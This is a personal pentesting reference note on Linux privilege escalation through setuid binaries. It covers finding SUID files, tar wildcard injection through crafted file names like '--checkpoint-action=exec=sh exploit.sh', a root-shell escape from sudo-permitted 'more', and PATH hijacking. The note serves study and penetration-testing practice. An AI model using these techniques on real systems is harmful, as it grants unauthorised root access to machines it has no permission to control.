---
id: exploit_setuid_binaries
aliases:
  - SETUID
tags:
  - privilege_escalation
  - linux
---

## Usage:
The setuid/setgid (SUID/SGID) bits allows the binary to run with the privileges of the user/group owner instead of those of the user executing it. They can be spotted with the s or S permission in the file user or group owner permissions (i.e. ---s--s---). When the file permissions features an uppercase S instead of a lowercase one, it means the corresponding user or group owner doesn't have execution rights. 
> [!WARNING]
> - Just like capabilities, setuid and setgid bits are unset when a file is copied with cp or when its content changes.
> - Some partitions of the UNIX file system can be mounted with the nosuid option. In this case the setuid and setgid bits are ignored for binaries placed inside those partitions. It is a common good practice for tmpfs partitions like /tmp or/run. Searching the /proc/mounts pseudo-file for a nosuid flag can help find these partitions.

## Find SETUID:
- `sudo -l`
- find:
```bash
find $starting_path -perm -u=s -type f 2>/dev/null

# Or in octal mode
find $starting_path -perm -4000 -type f 2>/dev/null
  ```

## Exploit SETUID:
### Living off the land:
> [!WARNING]
> Check if the binary is in [GTFOBins](https://gtfobins.github.io/gtfobins/) for exploitation techniques
#### Examples:
  ##### Using [shell_wildcards](hack/vulnerabilities/shell_wildcards.md) and tar  
  - Imagine a scenario where a script backups a directory (that we can control) on the server each hour using tar like this :
   
       ```bash
       !/bin/bash
       mkdir -p /backups/
       cd /var/www/html/ && tar cvzf /backups/backup_$(date +%Y_%m_%d_%Hh%M).tar.gz *
       ``` 

  - To use these options in our exploit, we just need to create these two files in our directory, as well as the exploit.sh file, containing the command we want to run when we trigger the execution :
      ```bash 
      echo '' > '--checkpoint=1'
      echo '' > '--checkpoint-action=exec=sh exploit.sh'

      $ ls -lha 
      total 88K
      drwxrwxr-x 2 user user 4,0K avril 27 22:32 .
      drwxrwxrwt 89 user user 76K avril 27 22:31 ..
      -rw-rw-r-- 1 user user 0 avril 27 22:31 file1
      -rw-rw-r-- 1 user user 0 avril 27 22:31 file2
      -rw-rw-r-- 1 user user 1 avril 27 22:31 '--checkpoint=1'
      -rw-rw-r-- 1 user user 1 avril 27 22:32 '--checkpoint-action=exec=sh exploit.sh'
      -rwxrwxrwx 1 user user 784 avril 27 22:32 exploit.sh   
      ```
 ##### Using `more` and `sudo` :
  - Let's take an example, with this sudo configuration :
      ```bash
      $ sudo -l
      [sudo] password for user: 
      Matching Defaults entries for user on PC1:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
      ```
  - User user may run the following commands on PC1:
     `(ALL : NOPASSWD) /usr/bin/more /var/log/apache2/access.log`

  - In this case user can run the more command, but only to read a specific log file /var/log/apache2/access.log as root without password (NOPASSWD flag) :
     `sudo -u root /usr/bin/more /var/log/apache2/access.log`

  - You can assume this would be safe right ? Unfortunately, it's not. The more command has various useful options, one of them is !. When you're in more and you type an exclamation mark followed by the path to a binary file, you can execute it in a subprocess. For example if you type !/bin/sh in more, you will open a shell as the owner of the parent more process !:

     ```bash
      $ sudo -u root /usr/bin/more /var/log/apache2/access.log
      File content line 1
      File content line 2
      ...
      File content line n
      ------------------------
      !/bin/sh
      # 
      uid=0(root) gid=0(root) groups=0(root)
      #
      ```

### Relative path calls:
  1. Usage:
    - The SETUID can be exploited if it makes calls via relative starting_path
  2. Discovery:
    - It can be discovered with `strace` command
  3. Exploitation:
    - Create an exploit and name it the same as the command called by the SETUID
    - Put the exploit path in the $PATH env variable
    - Now when the SRYUID will make the call it will search for it in PATH and execute the exploit
